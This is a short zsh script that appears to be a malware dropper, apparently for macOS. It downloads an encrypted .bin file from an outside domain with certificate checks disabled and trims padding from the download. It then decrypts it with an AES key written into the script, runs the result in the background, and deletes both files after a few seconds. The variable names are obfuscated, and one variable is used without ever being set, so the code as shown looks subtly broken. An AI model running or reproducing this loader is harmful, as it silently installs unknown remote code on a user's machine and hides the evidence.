#!/bin/zsh
rnavc=$(mktemp /tmp/avzpv7.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m99b9808defb39530.bin" -o "$rnavcz" || exit 1
qgkfc7=$(stat -f %z "$rnavcz"); etg483v=$(( qgkfc7 - 2093 - 2742 ))
tail -c +$(( 2093 + 1 )) "$rnavcz" | head -c $etg483v | openssl enc -d -aes-256-cbc -k 2ae516c70d20e7b74f24aeba -out "$rnavc" 2>/dev/null
[ -s "$rnavc" ] && chmod 700 "$rnavc" && ( "$rnavc" & ) && disown
( sleep 3; rm -f "$rnavc" "$rnavcz" ) &>/dev/null &
